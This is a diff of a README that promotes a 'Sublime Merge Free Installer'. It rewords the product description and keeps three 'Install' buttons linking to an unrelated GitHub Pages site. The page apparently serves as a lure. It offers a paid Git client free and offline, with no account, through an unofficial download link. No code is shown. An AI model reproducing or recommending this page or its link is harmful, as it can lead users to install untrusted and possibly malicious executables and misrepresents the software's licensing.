@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Sublime Merge Free Installer** — Sublime Merge is a fast, cross-platform Git client from the makers of Sublime Text. Works without internet access, no account required. Full offline installation.
+**💻 Sublime Merge Free Installer** — Sublime Merge is a fast, powerful Git client from the creators of Sublime Text for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime%20Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime+Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Sublime Merge
 
-Sublime Merge is a fast, cross-platform Git client from the makers of Sublime Text. It provides a clean commit history, built-in merge conflict tool, powerful search, and the same performance philosophy as Sublime Text — lightning-fast even on large repositories.
+Sublime Merge is a fast, powerful Git client from the creators of Sublime Text for Windows, macOS, and Linux. Features a visual commit history, three-way merge conflict resolution, line-by-line staging, and Sublime Text's signature multi-cursor editing in the diff view. Sublime Merge's performance and keyboard-driven workflow appeal to developers who value speed and precision in their Git tools.
 
 ---
 
 ## ❌ Problem: Sublime Merge is hard to access
 
-- **Paid License** — Requires purchase (perpetual trial with occasional nag available like Sublime Text)
-- **Limited GitHub Integration** — Pull request management requires opening GitHub in browser
-- **Windows, macOS, Linux** — Good cross-platform support but no mobile client
-- **Interface Minimalism** — Less visual than GitKraken for users wanting colorful graphs
+- **Commercial License** — Requires paid license after evaluation period
+- **GitHub Integration** — Less GitHub workflow integration than GitHub Desktop
+- **Advanced Git** — Some very advanced Git operations still benefit from command line
+- **Learning Curve** — Keyboard-driven workflow requires learning shortcuts
 
 ---
 
@@ -81,7 +81,7 @@ Sublime Merge is a fast, cross-platform Git client from the makers of Sublime Te
 
 <div align="center">
 
-[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime%20Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime+Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Sublime Merge is a fast, cross-platform Git client from the makers of Sublime Te
 
 ---
 
-**Sublime Merge Free Installer** — Sublime Merge is a fast, cross-platform Git client from the makers of Sublime Text. Install without internet connection today!
+**Sublime Merge Free Installer** — Sublime Merge is a fast, powerful Git client from the creators of Sublime Text for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime%20Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Sublime Merge](https://img.shields.io/badge/⬇_Install_Sublime+Merge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
